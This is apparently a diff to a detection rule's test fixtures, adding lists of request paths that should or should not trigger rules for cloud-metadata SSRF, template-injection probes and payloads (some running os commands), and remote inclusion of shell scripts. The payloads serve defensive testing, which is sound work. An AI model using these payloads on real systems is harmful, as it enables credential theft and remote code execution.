@@ -508,3 +508,114 @@ no_match = [
   "/gpon-review",
   "/products/boaform-guide.html",
 ]
+
+[ssrf-cloud-metadata]
+match = [
+  "/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+  "/proxy?target=http%3A%2F%2F169.254.169.254%2Flatest%2Fuser-data",
+  "/img?src=http://metadata.google.internal/computeMetadata/v1/instance/",
+  "/f?u=100.100.100.200/latest/meta-data",
+  "/f?u=http://169.254.170.2/v2/credentials",
+  "/f?u=http://[fd00:ec2::254]/latest/meta-data",
+  "/f?u=http://169.254.169.254.nip.io/latest",
+  "/f?u=http://METADATA.AZURE.COM/metadata/instance",
+]
+no_match = [
+  "/fetch?url=https://example.com/home",
+  "/fetch?url=http://169.254.1.5/status",
+  "/fetch?ip=169.254.169.2540",
+  "/fetch?ip=1169.254.169.254",
+  "/fetch?q=100.100.100.2000",
+  "/docs/metadata?section=google",
+  "/blog/what-is-instance-metadata",
+  "/f?ip=10.169.254.169.254",
+]
+
+[ssti-arithmetic-probe]
+match = [
+  "/greet?name={{7*7}}",
+  "/greet?name=${7*7}",
+  "/greet?name=%23{7*7}",
+  "/greet?name=<%= 7*7 %>",
+  "/greet?name={{7*'7'}}",
+  "/greet?name={{ 7 * 7 }}",
+  "/greet?name=%7B%7B133*7%7D%7D",
+  "/greet?name={%print 7*7%}",
+  "/greet?name={{(3)*(4)}}",
+  "/greet?name={{'7'*7}}",
+]
+no_match = [
+  "/product?id={{item.id}}",
+  "/product?price=${price}",
+  "/calc?expression=7*7",
+  "/search?q={7*7}",
+  "/page/{{title}}",
+  "/greet?name={{ user.name }}",
+  "/range?r={1-5}",
+  "/greet?name={{7*7",
+  "/greet?name=${7*7 and more",
+]
+
+[ssti-engine-internals]
+match = [
+  "/greet?name={{''.__class__.__mro__[1].__subclasses__()}}",
+  "/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+  "/greet?name=${T(java.lang.Runtime).getRuntime().exec('id')}",
+  "/greet?name={{cycler.__init__.__globals__.os.popen('id').read()}}",
+  "/greet?name=#{new java.lang.ProcessBuilder('id')}",
+  "/greet?name={%25 for c in [].__class__.__base__.__subclasses__() %25}",
+  "/greet?name=%7B%7Blipsum.__globals__%7D%7D",
+  "/g?n={{x.__class__}}",
+  "/g?n={{x.__mro__}}",
+  "/g?n={{x.__subclasses__()}}",
+  "/g?n={{x.__globals__}}",
+  "/g?n={{x.__builtins__}}",
+  "/g?n={{x.__import__('os')}}",
+  "/g?n={{x.__init__}}",
+  "/g?n={{x.__base__}}",
+  "/g?n=${T(java.lang.System).exit(1)}",
+  "/g?n=${@java.lang.System@getProperty('os.name')}",
+  "/g?n=${x.getRuntime()}",
+  "/g?n={{cycler.__foo}}",
+  "/g?n={{lipsum.__foo}}",
+  "/g?n={{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.__class__}}",
+]
+no_match = [
+  "/greet?name={{config}}",
+  "/greet?name={{ self }}",
+  "/docs?topic=__init__.py",
+  "/docs/python/__class__",
+  "/s?q=java.lang.Runtime",
+  "/s?q=${price}+java",
+  "/product?id={{item.__id__}}",
+]
+
+[rfi-script-on-address]
+match = [
+  "/index.php?page=http://203.0.113.66/shell.txt",
+  "/index.php?file=https://198.51.100.9:8080/x/a.php?",
+  "/index.php?include=ftp://192.0.2.5/c99.php",
+  "/index.php?page=http://203.0.113.66/shell.txt%00",
+  "/view?x=http%3A%2F%2F203.0.113.66%2Fbot.sh",
+  "/index.php?module=http://198.51.100.1/id.pl",
+  "/i.php?page=http://203.0.113.66/x.phtml",
+  "/i.php?page=http://203.0.113.66/x.py",
+  "/i.php?page=http://203.0.113.66/x.jsp",
+  "/i.php?page=http://203.0.113.66/x.asp",
+  "/i.php?page=http://203.0.113.66/x.aspx",
+  "/i.php?page=http://203.0.113.66/x.inc",
+  "/i.php?page=http://203.0.113.66/x.cgi",
+  "/i.php?page=http://203.0.113.66/x.php5",
+]
+no_match = [
+  "/redirect?to=https%3A%2F%2Fexample.com%2Fhome",
+  "/redirect?url=http://203.0.113.5/",
+  "/redirect?url=http://203.0.113.5/docs/page.html",
+  "/redirect?url=http://203.0.113.5/readme.txtfile",
+  "/view?u=https://example.com/readme.txt",
+  "/login?next=https://partner.example/login.php",
+  "/index.php?page=about",
+  "/v?ip=203.0.113.66&file=shell.txt",
+  "/i.php?page=http://203.0.113.66/notatxt",
+  "/i.php?page=http://203.0.113.66/x.phpx",
+]
